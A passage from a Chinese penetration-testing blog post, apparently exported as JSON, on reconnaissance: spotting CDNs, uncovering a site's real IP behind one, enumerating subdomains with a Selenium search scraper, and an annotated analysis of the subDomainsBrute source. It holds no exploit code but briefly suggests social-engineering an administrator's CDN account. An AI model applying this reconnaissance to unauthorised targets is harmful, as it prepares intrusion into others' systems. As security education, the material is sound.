sub = line.strip()\n            if sub and sub not in next_subs:\n                tmp_set = {sub}\n                \n                # 如果子域名模块包含占位符，如{alphnum}，则进行替换操作\n                while tmp_set:\n                    item = tmp_set.pop()\n                    if item.find('{alphnum}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                            tmp_set.add(item.replace('{alphnum}', _letter, 1))\n                    elif item.find('{alpha}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz':\n                            tmp_set.add(item.replace('{alpha}', _letter, 1))\n                    elif item.find('{num}') >= 0:\n                        for _letter in '0123456789':\n                            tmp_set.add(item.replace('{num}', _letter, 1))\n                    elif item not in next_subs:\n                        next_subs.append(item)\n    return next_subs\n```\n\n加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。\n\n在子域名中还存在一个**泛解析**的问题，这个工具里面解决了这个问题\n\n```python\nasync def async_wildcard_test(domain, dns_servers, level=1):\n    try:\n        # 创建异步DNS解析器\n        r = dns.asyncresolver.Resolver()\n        # 使用DNS服务器解析域名\n        r.nameservers = dns_servers\n        # 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在\n        answers = await r.resolve('lijiejie-not-existed-test.%s' % domain, 'A', lifetime=10)\n        # 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析\n        ips = ', '.join(sorted([answer.address for answer in answers]))\n        # 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2\n        if level == 1:\n            print('any-sub.%s\\t%s' % (domain.ljust(30), ips))\n            await async_wildcard_test('any-sub.%s' % domain, dns_servers, 2)\n        # 打印提示信息，使用-w参数强制扫描通配符域名\n        elif level == 2:\n            print('\\nUse -w to enable force scan wildcard domain')\n            sys.exit(0)\n    except Exception as e:\n        return domain\n\ndef wildcard_test(domain, dns_servers):\n    # 获取当前的异步事件循环\n    loop = asyncio.get_event_loop()\n    # 等待异步任务完成\n    return loop.run_until_complete(\n        # 并行执行多个异步任务，并返回它们的结果\n        asyncio.gather(\n            async_wildcard_test(domain, dns_servers, level=1)\n        )\n    )[0]\n```\n\n通过给出一个不存在的域名检测，判断是否开启了泛解析\n\n接下来看看扫描模块\n\n```python\n# 爆破模块\nclass SubNameBrute(object):\n    # 初始化\n    def __init__(self, *params):\n        # 提取传入参数\n        self.domain, self.options, self.process_num, self.dns_servers, self.next_subs, \\\n            self.scan_count, self.found_count, self.queue_size_array, tmp_dir = params\n        self.dns_count = len(self.dns_servers)\n        self.scan_count_local = 0\n        self.found_count_local = 0\n        # 初始化DNS解析器\n        self.resolvers = [dns.asyncresolver.Resolver(configure=False) for _ in range(self.options.threads)]\n        for r in self.resolvers:\n            # 解析事件\n            r.lifetime = 6.0\n            # 超时时间\n            r.timeout = 10.0\n        # 优先队列和状态变量\n        self.queue = PriorityQueue()\n        self.ip_dict = {}\n        self.found_subs = set()\n        self.cert_subs = set()\n        self.timeout_subs = {}\n        self.no_server_subs = {}\n        self.count_time = time.time()\n        # 输出日志到文件\n        self.outfile = open('%s/%s_part_%s.txt' % (tmp_dir, self.domain, self.process_num), 'w')\n        self.normal_names_set = set()\n        self.lock = asyncio.Lock()\n        # 线程状态\n        self.threads_status = ['1'] * self.options.threads\n\n    # 加载子域名字典\n    async def load_sub_names(self):\n        normal_lines = []\n        wildcard_lines = []\n        wildcard_set = set()\n        regex_list = []\n        lines = set()\n        # 打开文件逐行读取子域名，跳过空行或重复子域名\n        with open(self.options.file) as inFile:\n            for line in inFile.readlines():\n                sub = line.strip()\n                if not sub or sub in lines:\n                    continue\n                lines.add(sub)\n\n                # 判断子域名是否含占位符\n                brace_count = sub.count('{')\n                if brace_count > 0:\n                    wildcard_lines.append((brace_count, sub))\n\t\t\t\t\t# 占位符处理\n                    sub = sub.replace('{alphnum}', '[a-z0-9]')\n                    sub = sub.replace('{alpha}', '[a-z]')\n                    sub = sub.replace('{num}', '[0-9]')\n                    # 去重\n                    if sub not in wildcard_set:\n                        wildcard_set.add(sub)\n                        regex_list.append('^' + sub + '$')\n                else:\n                    # 普通子域名直接加入列表\n                    normal_lines.append(sub)\n                    self.normal_names_set.add(sub)\n\n        if regex_list:\n            pattern = '|'.join(regex_list)\n            _regex = re.compile(pattern)\n            for line in normal_lines:\n                if _regex.search(line):\n                    normal_lines.remove(line)\n\t\t\n        # 普通子域名加入队列，优先级为0\n        for _ in normal_lines[self.process_num::self.options.process]:\n            await self.queue.put((0, _))    # priority set to 0\n        \n        # 含占位符的子域名直接加入队列\n        for _ in wildcard_lines[self.process_num::self.options.process]:\n            await self.queue.put(_)\n\n    # 检测进程状态\n    async def update_counter(self):\n        while True:\n            if '1' not in self.threads_status:\n                return\n            self.scan_count.value += self.scan_count_local\n            self.scan_count_local = 0\n            self.queue_size_array[self.process_num] = self.queue.qsize()\n            if self.found_count_local:\n                self.found_count.value += self.found_count_local\n                self.found_count_local = 0\n            self.count_time = time.time()\n            await asyncio.sleep(0.5)\n\n    # 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名\n    async def check_https_alt_names(self, domain):\n        try:\n            # 建立异步HTTPS连接\n            reader, _ = await asyncio.open_connection(\n                host=domain,\n                port=443,\n                ssl=True,\n                server_hostname=domain,\n            )\n            # 获取证书详细信息\n            for item in reader._transport.get_extra_info('peercert')['subjectAltName']:\n                if item[0].upper() == 'DNS':\n                    name = item[1].lower()\n                    # 筛选符合条件的子域名\n                    if name.endswith(self.domain):\n                        sub = name[:len(name) - len(self.domain) - 1]    # new sub\n                        sub = sub.replace('*', '')\n                        sub = sub.strip('.')\n                        # 去重并添加到任务队列\n                        if sub and sub not in self.found_subs and \\\n                                sub not in self.normal_names_set and sub not in self.cert_subs:\n                            self.cert_subs.add(sub)\n                            await self.queue.put((0, sub))\n        except Exception as e:\n            pass\n\n\n    # 查询DNS解析结果，并限制查询的超时时间\n    async def do_query(self, j, cur_domain):\n        async with timeout(10.2):\n            return await self.resolvers[j].resolve(cur_domain, 'A')\n\n    # 扫描\n    async def scan(self, j):\n        # 设置DNS解析器\n        self.resolvers[j].nameservers = [self.dns_servers[j % self.dns_count]]\n        if self.dns_count > 1:\n            while True:\n                s = random.choice(self.dns_servers)\n                if s != self.dns_servers[j % self.dns_count]:\n                    self.resolvers[j].nameservers.append(s)\n                    break\n        empty_counter = 0\n        \n        # 处理子域\n        while True:\n            try:\n                brace_count, sub = self.queue.get_nowait()\n                self.threads_status[j] = '1'\n                empty_counter = 0\n            except asyncio.queues.QueueEmpty as e:\n                empty_counter += 1\n                if empty_counter > 10:\n                    self.threads_status[j] = '0'\n                if '1' not in self.threads_status:\n                    break\n                else:\n                    await asyncio.sleep(0.1)\n                    continue\n\n            # 对于带有通配符的子域进行处理\n            if brace_count > 0:\n                brace_count -= 1\n                if sub.find('{next_sub}') >= 0:\n                    for _ in self.next_subs:\n                        await self.queue.put((0, sub.replace('{next_sub}', _)))\n                if sub.find('{alphnum}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                        await self.queue.put((brace_count, sub.replace('{alphnum}', _, 1)))\n                elif sub.find('{alpha}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz':\n                        await self.queue.put((brace_count, sub.replace('{alpha}', _, 1)))\n                elif sub.find('{num}') >= 0:\n                    for _ in '0123456789':\n                        await self.queue.put((brace_count, sub.replace('{num}', _, 1)))\n                continue\n\n            try:\n                if sub in self.found_subs:\n                    continue\n\n                self.scan_count_local += 1\n                cur_domain = sub + '.' + self.domain\n\n                # 执行DNS查询\n                answers = await self.do_query(j, cur_domain)\n                \n                # 处理DNS查询结果，排除无效IP\n                if answers:\n                    self.found_subs.add(sub)\n                    ips = ', '.join(sorted([answer.address for answer in answers]))\n                    invalid_ip_found = False\n                    for answer in answers:\n                        if answer.address in ['1.1.1.1', '127.0.0.1', '0.0.0.0', '0.0.0.1']:\n                            invalid_ip_found = True\n                    if invalid_ip_found:\n                        continue\n                    if self.options.i and is_intranet(answers[0].host):\n                        continue\n\n                    try:\n                        # 查询CNAME记录\n                        cname = str(answers.canonical_name)[:-1]\n                        if cname != cur_domain and cname.endswith(self.domain):\n                            cname_sub = cname[:len(cname) - len(self.domain) - 1]    # new sub\n                            if cname_sub not in self.found_subs and cname_sub not in self.normal_names_set:\n                                await self.queue.put((0, cname_sub))\n                    except Exception as e:\n                        pass\n\n                    first_level_sub = sub.split('.')[-1]\n                    max_found = 20\n\n                    if self.options.w:\n                        first_level_sub = ''\n                        max_found = 3\n\n                    if (first_level_sub, ips) not in self.ip_dict:\n                        self.ip_dict[(first_level_sub, ips)] = 1\n                    else:\n                        self.ip_dict[(first_level_sub, ips)] += 1\n                        if self.ip_dict[(first_level_sub, ips)] > max_found:\n                            continue\n\n                    self.found_count_local += 1\n\n                    # 将查询结果写入文件\n                    self.outfile.write(cur_domain.ljust(30) + '\\t' + ips + '\\n')\n                    self.outfile.flush()\n\n                    # 检查HTTPS证书\n                    if not self.options.no_cert_check:\n                        async with timeout(10.0):\n                            await self.check_https_alt_names(cur_domain)\n\n                    try:\n                        self.scan_count_local += 1\n                        await self.do_query(j, 'lijiejie-test-not-existed.' + cur_domain)\n\n                    except dns.resolver.NXDOMAIN as e:\n                        if self.queue.qsize() < 20000:\n                            for _ in self.next_subs:\n                                await self.queue.put((0, _ + '.' + sub))\n                        else:\n                            await self.queue.put((1, '{next_sub}.' + sub))\n                    except Exception as e:\n                        continue\n\n            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) as e:\n                pass\n            except dns.resolver.NoNameservers as e:\n                self.no_server_subs[sub] = self.no_server_subs.get(sub, 0) + 1\n                if self.no_server_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except (dns.exception.Timeout, dns.resolver.LifetimeTimeout) as e:\n                self.timeout_subs[sub] = self.timeout_subs.get(sub, 0) + 1\n                if self.timeout_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except Exception as e:\n                if str(type(e)).find('asyncio.exceptions.TimeoutError') < 0:\n                    with open('errors.log', 'a') as errFile:\n                        errFile.write('[%s] %s\\n' % (type(e), str(e)))\n\n    async def async_run(self):\n        await self.load_sub_names()\n        tasks = [self.scan(i) for i in range(self.options.threads)]\n        tasks.insert(0, self.update_counter())\n        await asyncio.gather(*tasks)\n\n    def run(self):\n        loop = asyncio.get_event_loop()\n        asyncio.set_event_loop(loop)\n        loop.run_until_complete(self.async_run())\n\ndef run_process(*params):\n    # 信号处理器\n    signal.signal(signal.SIGINT, user_abort)\n    # 调用SubNameBrute的run方法\n    s = SubNameBrute(*params)\n    s.run()\n\n# 根据option.process启动多个进程\nfor process_num in range(options.process):\n    p = multiprocessing.Process(\n        # 调用run_process进行扫描\n        target=run_process,\n        args=(domain, options, process_num, dns_servers, next_subs,\n              scan_count, found_count, queue_size_array, tmp_dir)\n    )\n    all_process.append(p)\n    p.start()\n```\n\n总体的工作路径为：\n\n- **加载子域名**：从文件中读取子域名，识别通配符，放入任务队列\n- 扫描子域\n  - 多线程扫描子域\n  - 对每个子域执行DNS查询，处理返回结果\n  - 对子域名进行证书检查，CNAME解析等附加操作\n- **记录结果**\n- **错误处理与重试**：对于DNS查询失败的子域进行重试，最多三次\n\n这里有个证书检查和CNAME解析，还有一个称呼叫**证书透明度**主要原因是**提高全面性**。在**SSL/TLS**证书中的`subjectAltName`字段会暴露一些隐藏子域。**CNAME**是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。\n\n**对于通配符子域名的处理**：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。\n","slug":"信息收集(TODO)","published":1,"updated":"2025-03-04T14:36:47.269Z","comments":1,"layout":"post","photos":[],"_id":"cm7ussay80008asjf00ut25cx","content":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><blockquote>\n<p>信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。</p>\n</blockquote>\n<h2 id=\"域名（Domain）\"><a href=\"#域名（Domain）\" class=\"headerlink\" title=\"域名（Domain）\"></a>域名（Domain）</h2><blockquote>\n<p>域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。</p>\n</blockquote>\n<h3 id=\"判断CDN\"><a href=\"#判断CDN\" class=\"headerlink\" title=\"判断CDN\"></a>判断CDN</h3><p>内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？</p>\n<p>CDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。</p>\n<p><strong>ping域名判断是否有CDN</strong></p>\n<p>当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png\" alt=\"img\"></p>\n<p><strong>nslookup判断CDN</strong></p>\n<p>nslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。</p>\n<p>通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png\" alt=\"img\"></p>\n<p><strong>多地ping判断CDN</strong></p>\n<p><a href=\"https://ping.chinaz.com/\">站长工具</a>还是比较直观的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png\" alt=\"img\"></p>\n<h3 id=\"查看真实IP\"><a href=\"#查看真实IP\" class=\"headerlink\" title=\"查看真实IP\"></a>查看真实IP</h3><p>检测完CDN，就该绕过CDN检测了，获取真实IP</p>\n<p><strong>多地ping</strong></p>\n<p>不仅是检测CDN，同时也可以用来判断。</p>\n<p>如<code>www.youzan.com</code>，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png\" alt=\"img\"></p>\n<p><strong>子域名查询真实IP</strong></p>\n<p>CDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。</p>\n<p><strong>DNS历史记录</strong></p>\n<p>查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，<a href=\"https://viewdns.info/\">Viewdns</a>或者之前的开发工具都可以查询</p>\n<p><strong>SSL证书</strong></p>\n<p>加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。</p>\n<p><strong>漏洞查找</strong></p>\n<ul>\n<li>敏感文件泄露，如phpinfo等，github信息泄露等。</li>\n<li>XSS、命令执行、SSRF等。</li>\n<li>社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。</li>\n</ul>\n<p><strong>网站邮件</strong></p>\n<p>很多网站都自带<code>sendmail</code>，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP</p>\n<p><strong>F5 LTM解码</strong></p>\n<p>当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP</p>\n<figure class=\"highlight dns\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: BIGipServerpool_<span class=\"number\">8.29_8030</span>=<span class=\"number\">487098378</span>.<span class=\"number\">24095.0000</span></span><br><span class=\"line\">先把第一小节的十进制数取出来：<span class=\"number\">487098378</span></span><br><span class=\"line\">再转化为十六进制数：<span class=\"number\">1d</span>08880a</span><br><span class=\"line\">从后至前取四位数：<span class=\"number\">0</span>a.<span class=\"number\">88</span>.<span class=\"number\">08</span>.<span class=\"number\">1d</span></span><br><span class=\"line\">转化为十进制即为IP：<span class=\"number\">10.136.8.29</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p>在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。</p>\n<p><strong>搜索引擎收集</strong></p>\n<p>使用谷歌语法等可以收集大量信息，如<code>site:domain</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png\" alt=\"img\"></p>\n<p>尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write to file</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_file</span>(<span class=\"params\">file_path, content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_path, <span class=\"string\">'a'</span>, encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">            file.write(content + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># signal handler</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_handler</span>(<span class=\"params\">sig, frame</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">\"\\nuser pause\"</span>)</span><br><span class=\"line\">    sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># init selenium</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup_driver</span>():</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> webdriver.Chrome(options=options)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get domain in links</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extract_domain</span>(<span class=\"params\">link</span>):</span><br><span class=\"line\">    <span class=\"keyword\">match</span> = re.search(<span class=\"string\">r\"https://(.*?)/\"</span>, link)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">match</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">match</span>.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fetch links from result</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fetch_links</span>(<span class=\"params\">driver, domain, page</span>):</span><br><span class=\"line\">    url = <span class=\"string\">f\"https://www.google.com/search?q=site:<span class=\"subst\">{domain}</span>&amp;start=<span class=\"subst\">{page}</span>0\"</span></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        elements = driver.find_elements(By.CSS_SELECTOR, <span class=\"string\">\"#rso .kb0PBd.A9Y9g.jGGQ5e span &gt; a\"</span>)</span><br><span class=\"line\">        links = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> elements:</span><br><span class=\"line\">            link = element.get_attribute(<span class=\"string\">\"href\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> link:</span><br><span class=\"line\">                links.append(link)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> links</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f\"failed to fetch links: <span class=\"subst\">{e}</span>\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># signal init</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parse user input</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">\"Chrome search script\"</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-d\"</span>, <span class=\"string\">\"--domain\"</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"The domain to search\"</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-m\"</span>, <span class=\"string\">\"--maxpage\"</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"The maximum number to search\"</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parameter assignment</span></span><br><span class=\"line\">    domain = args.domain</span><br><span class=\"line\">    max_page = args.maxpage</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># init driver</span></span><br><span class=\"line\">    driver = setup_driver()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># remove duplicates</span></span><br><span class=\"line\">    unique_links = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Start crawling from the first page</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, max_page + <span class=\"number\">1</span>):</span><br><span class=\"line\">        links = fetch_links(driver, domain, page)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Traverse links, extract and save unique domain names</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> links:</span><br><span class=\"line\">            domain_name = extract_domain(link)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> domain_name <span class=\"keyword\">and</span> domain_name <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> unique_links:</span><br><span class=\"line\">                unique_links.add(domain_name)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(domain_name)</span><br><span class=\"line\">                write_file(<span class=\"string\">\"domain.txt\"</span>, domain_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># close driver</span></span><br><span class=\"line\">    driver.quit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>资产测绘工具搜集</strong></p>\n<p>使用资产测绘工具收集，如<strong>fofa、hunter、360quake、微步</strong>等，包括使用站长之家等等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png\" alt=\"img\"></p>\n<p><strong>使用自动化工具</strong></p>\n<p>这里对两种开源的工具进行源码分析，了解其原理</p>\n<h4 id=\"SubDomainBrute源码分析\"><a href=\"#SubDomainBrute源码分析\" class=\"headerlink\" title=\"SubDomainBrute源码分析\"></a><strong>SubDomainBrute源码分析</strong></h4><p>这里只分析主要代码</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 加载DNS服务器地址</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_dns_servers</span>():</span><br><span class=\"line\">    print_msg(<span class=\"string\">'[+] Validate DNS servers'</span>, line_feed=<span 